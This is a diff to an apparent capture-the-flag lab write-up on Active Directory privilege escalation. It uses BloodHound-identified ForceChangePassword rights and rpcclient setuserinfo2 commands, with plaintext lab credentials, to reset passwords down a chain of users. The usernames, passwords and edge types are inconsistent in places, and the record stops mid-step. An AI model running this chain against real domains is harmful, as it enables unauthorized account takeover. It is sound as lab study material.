@@ -60,3 +60,47 @@ Transitive Object Control are objects this user can gain control of by performin
 	`ForceChangePassword` from `SHAWMA_BRAY` to `CRUZZ_HALL`.
 	
 	`GenericWrite` from `CRUZ_HALL` to `DARLA_WINTERS`.
+
+	This means we have a chance to own all these users by resetting their passwords, let's break it down :
+	- Use `TABATHA_BRITT` to reset the password of `SHAWNA_BRAY`.
+	- then  use `SHAWNA_BRAY` to reset the password of `CRUZ_HALL`.
+	- finally use `CRUZ_HALL` to reset the password of `DARLA_WINTERS`.
+
+### Changing  and resetting passwords
+In bloodhound, if you right click on one of the arrows that contains the `rights` you have on other users, you get a help section that contains techniques you could use to take advantage of those rights :
+
+![[Diagram.svg]]
+
+You got a command you can use to change the password of other users.
+```
+rpcclient -U thm.corp/TABATHA_BRITT%'marlboro(1985)' <MACHINE IP>
+
+```
+
+#### Resetting the password of `SHAWNA_BRAY` using `TABATHA_BRITT`'s credentials
+
+`rpcclient -U thm.corp/TABATHA_BRITT%'marlboro(1985)' 10.10.25.62``
+rpcclient $> `setuserinfo2 SHAWNA_BRAY 23 Password@4444`
+rpcclient $> `exit`
+
+Confirm that the changes were successful  choosing Execution rights->First degree RDP privileges.
+	
+	![[Screenshot from 2024-08-15 20-18-54.png]]
+
+#### SHAWNA_BRAY\@THM.CORP -> ForceChangePassword -> CRUZZ_HALL\@THM.CORP
+
+The **ForceChangePassword** permission allows us (in this case SHAWNA_BRAY\@THM.CORP) to reset a user's password without knowing their current password. So this user can reset CRUZZ_HALL\@THM.CORP's password.
+
+`rpcclient -U thm.corp/SHAWNA_BRAY%'Password@4444' 10.10.25.62`
+
+rpcclient $> `setuserinfo2 CRUZ_HALL 23 Password@4444`                           rpcclient $> `exit`   
+
+Confirm that the changes were successful  choosing Execution rights->First degree RDP privileges.
+
+![[Screenshot from 2024-08-15 20-43-32.png]]
+
+#### CRUZZ_HALL\@THM.CORP\ -> ForceChangePassword -> DARLA_WINTERS\@THM.CORP
+
+Same as above, this time CRUZZ_HALL\@THM.CORP can reset DARLA_WINTERS\@THM.CORP's password.
+
+`rpcclient -U thm.corp/CRUZZ_HALL%'Password@2038' 10.10.25.62`
